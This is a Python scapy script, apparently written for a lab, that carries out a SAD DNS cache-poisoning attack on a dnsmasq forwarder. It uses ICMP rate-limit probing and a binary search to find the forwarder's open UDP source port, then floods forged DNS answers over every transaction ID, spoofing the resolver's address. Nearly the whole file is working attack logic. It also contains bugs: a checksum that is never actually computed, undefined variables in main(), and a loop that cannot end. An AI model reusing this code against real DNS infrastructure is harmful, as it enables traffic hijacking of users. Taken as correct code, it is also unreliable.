import dns.resolver
import socket
import random
from scapy.all import *

forwarder_ip = '192.168.1.241'
resolver_ip = '192.168.1.242'
domain_name = "attack.com"
forwarder_port = 53

ICMP_limit_rate = 100
ICMP_reply_wait_time = .1
min_port_scans = 1024
max_port_scans = 65535
dns_query_timeout = 600
finished = 0

raw_dns_replies = None
header = None

# nat network on oracle VM virtualbox
global_socket = conf.L2socket(iface='vbox_saddns_net')

def dns_query():
    my_ip = '192.168.1.240'
    my_port = 9999
    ip_layer = IP(dst=forwarder_ip, src=my_ip)
    udp_layer = UDP(dport=forwarder_port, sport=my_port)
    dns_layer = DNS(rd=1, qd=DNSQR(qname=domain_name))
    packet = ip_layer / udp_layer / dns_layer
    ret = sr1(packet, timeout=dns_query_timeout)
    print (ret.show())
    return

# modified version, just copy it with binary_search()
# this will return the port for you
# global_socket is conf.L2socket(iface='YOU_IFACE'), a scapy socket object
# ICMP_reply_wait_time is just global constant

def flood(port_start, number_of_padding_packet):
    now_port = port_start
    probe_packet = []
    
    for i in range(ICMP_limit_rate):
        ip_layer = IP(dst=forwarder_ip, src=resolver_ip)
        udp_layer = UDP(dport=now_port, sport=RandShort())
        packet = Ether() / ip_layer / udp_layer
        probe_packet.append(raw(packet))
        now_port += 1

    ip_layer = IP(dst=forwarder_ip)
    udp_layer = UDP(dport=1, sport=RandShort())
    verification_packet = Ether() / ip_layer / udp_layer

    for packet in probe_packet:
        global_socket.send(packet)

    reply = global_socket.sr1(verification_packet, timeout=ICMP_reply_wait_time)
    # no open port
    if reply == None:
        return -1
    # ICMP port unreachable message
    else:
        if reply.haslayer(ICMP):
            return port_start
    return 0

def binary_search(left, right):
    mid = left + (right - left) // 2
    if left == right:
        return flood(left, ICMP_limit_rate - 1)

    # find open port on left
    ret1 = flood(left, ICMP_limit_rate - (mid - left + 1))
    if ret1 == left:
        return binary_search(left, mid)

    # no open port on left, continue to right
    ret2 = flood(mid + 1, ICMP_limit_rate - (right - mid))
    if ret2 == mid + 1:
        return binary_search(mid + 1, right)

    # no open port found
    return -1

def prepare_dns_replies(port):
    dns_replies = []
    for txid in range(1024, 65536):
        dns_replies.append(
            Ether()
            / IP(dst=forwarder_ip, src=resolver_ip)
            / UDP(sport=53, dport=0)
            / DNS(id=txid, qr=1, qdcount=1, ancount=1, aa=1,
                    qd=DNSQR(qname=domain_name, qtype=0x0001, qclass=0x0001),
                    an=DNSRR(rrname=domain_name, ttl=70000, rdata="255.255.255.255"))
        )
    # reference https://www.geeksforgeeks.org/struct-module-python/
    raw_dns_replies = []
    for dns_reply in dns_replies:
        raw_dns_replies.append(bytearray(raw(dns_reply)))
    header = struct.pack(
        "!4s4sHH",
        inet_pton(socket.AF_INET, dns_replies[0]["IP"].src),
        inet_pton(socket.AF_INET, dns_replies[0]["IP"].dst),
        socket.IPPROTO_UDP,
        len(raw_dns_replies[0][34:]),
    )
    return (raw_dns_replies, header)

def forge_DNS_response(actual_port):
    global raw_dns_replies, header
    for reply in raw_dns_replies:
        # update actual port
        reply[36] = (actual_port >> 8) & 0xFF
        reply[37] = actual_port & 0xFF
        # update checksum
        reply[40] = 0x00
        reply[41] = 0x00
        calculate_check_sum = header + reply[34:0]
        if calculate_check_sum == 0:
            calculate_check_sum = 0xFFFF
        check_sum = struct.pack("!H", calculate_check_sum)
        reply[40] = check_sum[0]
        reply[41] = check_sum[1]
        global_socket.send(reply)
    return True

def main():

    # run dns_query() on victim with dnsmasq installed and IP configured

    # run main() on attacker

    global raw_dns_replies, header
    raw_dns_replies, header = prepare_dns_replies(9999)
    start = min_port_scans

    while finished == 0:
        while min_port_scans + ICMP_limit_rate <= max_port_scans:
            ret = flood(start, 0)
            if ret > 0:
                port = binary_search(start_port, start_port + number_of_ports - 1)
                if port > 0:
                    result = forge_DNS_response(port)
                    if result == True:
                        finished = 1
                        return
            start += ICMP_limit_rate

    # To view cache, run "cat /var/lib/misc/dnsmasq.leases" on victim

if __name__ == "__main__":
    main() 
